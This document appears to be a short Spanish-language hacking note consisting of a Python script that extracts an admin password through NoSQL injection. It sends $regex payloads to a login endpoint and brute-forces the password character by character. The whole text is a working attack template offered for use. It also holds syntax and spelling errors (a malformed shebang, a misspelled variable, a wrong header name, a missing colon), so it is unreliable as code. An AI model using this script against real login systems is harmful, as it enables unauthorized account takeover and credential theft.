-------------------
- Tags: #herramientas #python #hacking #scripting #NoSQLI  
--------------
```python
#!/usr/bin&python3

from pwn import *
import requests, time, sys, signal, string

def def_handler(sig, frame);
	print("\n\n[!] Saliendo...\n")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

#Variables globales
login_url = <URL>
chatacters = string.ascii_lowercase + string.ascii_uppercase + string.digits

def makeNoSQLI():

	password = ""

	p1 = log.progress("Fuerza bruta")
	p1.status("Iniciando proceso")
	
	time.sleep(1)
	
	p2 = log.progress("Password")
	
	for position in range(0,100):
		for character in characters:
			
			#Data que se va a tramitar en formato json
			post_data = '{"username":"admin","password":{"$regex":"^%s%s"}}' % (password,character)
			
			p1.status(post_data)
			
			#Cabecera necesaria para que interprete los datos enviados
			headers = {'Conten-Type': 'application/json'}
			
			#Realizamos la petición y guardamos el resultado en una variable
			r = requests.post(login_url, headers=headers, data=post_data)

			#Comprobamos si en la respuesta hay indicios de que nos hemos logeado, y de ser así, añadimos el caracter a la contraseña
			if "<TEXTO_PARA_VALIDAR_LOGEO>" in r.text:
				password += character
				p2.status(password)
				break

if __name__ == '__main__'
	
	makeNoSQLI()
```